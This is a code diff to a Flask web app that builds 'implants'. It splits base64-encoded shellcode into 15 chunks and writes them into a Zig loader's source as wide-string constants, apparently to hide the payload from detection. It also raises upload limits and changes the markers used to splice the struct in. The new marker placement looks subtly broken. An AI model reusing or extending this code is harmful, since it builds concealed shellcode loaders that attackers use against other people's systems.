@@ -12,9 +12,9 @@ from datetime import datetime
 app = Flask(__name__, 
     static_url_path='/static',
     static_folder='static')
-app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024 # this will resolve the issue with docker env to handle large POST requests. 
+app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024  # this will resolve the issue with docker env to handle large POST requests. 
 app.config['IMPLANTS_DIR'] = 'implants'  # Directory to store implants
-app.config['MAX_FORM_MEMORY_SIZE'] = 16 * 1024 * 1024 # this will resolve the issue with docker env to handle large POST requests. 
+app.config['MAX_FORM_MEMORY_SIZE'] = 32 * 1024 * 1024   # this will resolve the issue with docker env to handle large POST requests. 
 
 # Ensure implants directory exists
 if not os.path.exists(app.config['IMPLANTS_DIR']):
@@ -62,17 +62,24 @@ def calculate_md5(file_path):
     return md5.hexdigest()
 
 def split_base64_string(encoded_content, num_parts=15):
-    """Split base64 string into equal parts"""
-   
+    """Split base64 string into optimized chunks while preserving all data"""
     total_length = len(encoded_content)
-    length_per_part = math.ceil(total_length / num_parts)
+    # Calculate base chunk size, rounding up to ensure we don't lose data
+    base_chunk_size = (total_length + num_parts - 1) // num_parts
     
-
     parts = []
-    for i in range(0, total_length, length_per_part):
-        parts.append(encoded_content[i:i + length_per_part])
+    current_pos = 0
     
-  
+    while current_pos < total_length and len(parts) < num_parts:
+        # For the last part, take all remaining content
+        if len(parts) == num_parts - 1:
+            chunk = encoded_content[current_pos:]
+        else:
+            chunk = encoded_content[current_pos:current_pos + base_chunk_size]
+        parts.append(chunk)
+        current_pos += len(chunk)
+    
+    # Pad with empty strings if needed
     while len(parts) < num_parts:
         parts.append("")
     
@@ -138,18 +145,22 @@ def index():
                 with open('../src/main.zig', 'r') as t:
                     zig_code = t.read()
                 
-                struct_content = "const SH = struct {\n"
+                struct_content = "//START HERE\n"
+                struct_content += "const SH = struct {\n\n"
+                struct_content += "//END HERE\n"
+      
+
                 for i, part in enumerate(shellcode_parts, 1):
                     struct_content += f'    const b{i} = ComptimeWS("{part}");\n'
                 struct_content += "\n    pub fn getshellcodeparts() [15][]const u16 {\n"
                 struct_content += "         return .{  b1,  b2,  b3,  b4,  b5,  b6,  b7,  b8,  b9,  b10,  b11,  b12,  b13,  b14,  b15, \n"
                 struct_content += "    };\n"
-               # struct_content += "}\n"
-               # struct_content += "};\n"
+                struct_content += "}\n"
+                struct_content += "};\n"
                 
                 
                 zig_code = re.sub(
-                    r'const SH = struct \{[\s\S]*?\};',
+                    r'//START HERE[\s\S]*?//END HERE',
                     struct_content,
                     zig_code
                 )
